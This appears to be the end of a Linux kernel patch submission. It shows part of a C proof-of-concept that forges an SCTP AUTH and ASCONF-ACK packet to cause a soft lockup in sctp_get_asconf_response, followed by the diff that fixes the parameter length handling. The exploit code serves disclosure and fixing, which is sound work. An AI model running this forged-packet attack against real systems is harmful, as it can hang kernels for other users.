	size_t lvn = make_vector(&local_ap, lv);
	size_t pvn = make_vector(&peer_ap, pv);
	size_t sn;
	if (cmp_vectors(lv, lvn, pv, pvn) < 0) {          /* local smaller first */
		memcpy(secret, lv, lvn); memcpy(secret + lvn, pv, pvn);
		sn = lvn + pvn;
	} else {
		memcpy(secret, pv, pvn); memcpy(secret + pvn, lv, lvn);
		sn = pvn + lvn;
	}
	printf("[+] key_id=0 secret: local_vec=%zuB peer_vec=%zuB -> secret=%zuB (all public)\n",
	       lvn, pvn, sn);

	/* ---- AUTH chunk + ASCONF-ACK, HMAC-SHA1 over AUTH..end ---- */
	unsigned char pkt[700];
	size_t q = 0;
	size_t auth_start = q;
	pkt[q++] = SCTP_CHUNK_AUTH; pkt[q++] = 0;
	unsigned short lpq = q; q += 2;
	*(unsigned short *)(pkt + lpq) = htons(28); /* hdr4 + auth_hdr4 + 20B digest */
	*(unsigned short *)(pkt + q) = htons(0 /* key_id 0 */); q += 2;
	*(unsigned short *)(pkt + q) = htons(SCTP_HMAC_ID_SHA1); q += 2;
	q += 20;              /* digest placeholder, zeroed during MAC */
	memcpy(pkt + q, ack, a); q += a;

	memset(pkt + auth_start + 8, 0, 20);
	uint8_t mac[20];
	hmac_sha1(secret, sn, pkt + auth_start, q - auth_start, mac);
	memcpy(pkt + auth_start + 8, mac, 20);
	(void)lpq;

	printf("[*] sending forged AUTH + ASCONF-ACK (%zu bytes, key_id=0)\n", q);
	send_sctp(srv, srv, SCTP_PORT_CLIENT, SCTP_PORT_SERVER, my_vtag, pkt, q);

	printf("[*] if the forged HMAC passes, victim spins in sctp_get_asconf_response\n");
	printf("[*] wait ~25s, then check dmesg for 'soft lockup'\n");
	sleep(30);
	kill(vic, SIGKILL);
	waitpid(vic, NULL, 0);
	return 0;
}

 net/sctp/sm_make_chunk.c | 6 ++++--
 1 file changed, 4 insertions(+), 2 deletions(-)

diff --git a/net/sctp/sm_make_chunk.c b/net/sctp/sm_make_chunk.c
index 236e25abc7a42..1166d1c5ea584 100644
--- a/net/sctp/sm_make_chunk.c
+++ b/net/sctp/sm_make_chunk.c
@@ -3215,6 +3215,8 @@ bool sctp_verify_asconf(const struct sctp_association *asoc,
 		*errp = param.p;
 		switch (param.p->type) {
 		case SCTP_PARAM_ERR_CAUSE:
+			if (length < sizeof(struct sctp_addip_param))
+				return false;
 			break;
 		case SCTP_PARAM_IPV4_ADDRESS:
 			if (length != sizeof(struct sctp_ipv4addr_param))
@@ -3460,8 +3462,8 @@ static __be16 sctp_get_asconf_response(struct sctp_chunk *asconf_ack,
 		}
 
 		length = ntohs(asconf_ack_param->param_hdr.length);
-		asconf_ack_param = (void *)asconf_ack_param + length;
-		asconf_ack_len -= length;
+		asconf_ack_param = (void *)asconf_ack_param + SCTP_PAD4(length);
+		asconf_ack_len -= SCTP_PAD4(length);
 	}
 
 	return err_code;
-- 
2.43.0
